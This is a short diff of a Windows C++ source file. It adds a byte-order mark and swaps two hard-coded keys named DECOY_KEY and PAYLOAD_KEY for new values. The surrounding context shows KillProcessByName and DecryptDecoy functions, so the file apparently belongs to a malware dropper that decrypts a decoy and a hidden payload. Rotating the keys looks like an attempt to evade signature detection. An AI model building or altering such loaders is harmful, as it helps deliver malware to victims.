@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <shellapi.h>
 #include <Shlobj.h>
 #include <string>
@@ -52,8 +52,8 @@ void KillProcessByName(const WCHAR* szName) {
     }
 }
 
-#define DECOY_KEY "K0FxVOnrsFzk"
-#define PAYLOAD_KEY "ZhXuAkiW75wHmJAx"
+#define DECOY_KEY "2YbnkyMTUqUG"
+#define PAYLOAD_KEY "aq4sB4C9Nph4CZq0"
 
 void DecryptDecoy(BYTE* data, size_t size) {
     if (!data || size == 0) return;
